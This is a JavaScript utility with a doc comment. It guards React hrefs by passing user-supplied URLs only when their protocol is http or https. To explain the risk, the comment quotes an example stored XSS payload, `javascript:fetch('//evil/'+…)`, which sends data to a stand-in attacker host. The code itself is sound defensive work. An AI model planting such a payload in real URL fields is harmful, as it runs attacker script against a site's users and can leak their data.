/**
 * Guard for user-supplied URLs that get rendered into an `href`.
 *
 * React does not block `javascript:` hrefs — it warns in development and
 * renders them anyway — so a stored `javascript:fetch('//evil/'+…)` in a repo
 * or LeetCode URL field executes on this origin the moment someone clicks the
 * link. The backend stores these fields as plain strings, so the value can be
 * anything the API accepted.
 *
 * Returns the URL when it is a plain http(s) link, otherwise `undefined` — which
 * makes React drop the attribute entirely and renders a non-navigating element.
 */
export function safeExternalUrl(value) {
  if (typeof value !== 'string') return undefined;

  const trimmed = value.trim();
  if (!trimmed) return undefined;

  try {
    const parsed = new URL(trimmed);
    // Allowlist, not a blocklist: `javascript:`, `data:`, `vbscript:` and
    // `blob:` are all script-capable or spoofable in some browser somewhere.
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      return parsed.href;
    }
  } catch {
    // Not an absolute URL. A relative value would resolve against our own
    // origin, which is not what an "external link" field means, so reject it.
  }
  return undefined;
}
